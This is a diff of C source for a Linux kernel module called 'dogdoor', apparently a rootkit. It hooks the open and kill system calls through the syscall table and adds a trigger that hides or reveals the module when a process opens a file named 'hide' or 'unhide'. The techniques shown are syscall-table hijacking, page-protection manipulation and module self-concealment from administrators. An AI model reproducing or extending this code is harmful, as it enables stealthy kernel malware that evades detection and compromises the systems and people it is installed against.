@@ -70,17 +70,21 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 {
 	char fname[256] ;
 	char cmd[] = "hide";
+	char cmd2[] = "unhide";
 
 	copy_from_user(fname, filename, 256) ;
 
-	/*if (strcmp (fname, cmd) ==0) {
-		module_unhide() ;
-	}*/
-
-	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
-		count++ ;
+	if (strcmp (fname, cmd) ==0) {
+		module_hide() ;
+	}
+	if (strcmp (fname, cmd2) ==0) {
 		module_unhide();
 	}
+
+	/*if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
+		count++ ;
+		module_unhide();
+	}*/
 
 	return orig_sys_open(filename, flags, mode) ;
 }
@@ -161,8 +165,6 @@ int __init dogdoor_init(void) {
 
 	orig_sys_open = sctable[__NR_open] ;
 	orig_sys_kill = sctable[__NR_kill] ;
-
-	module_hide();
 
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
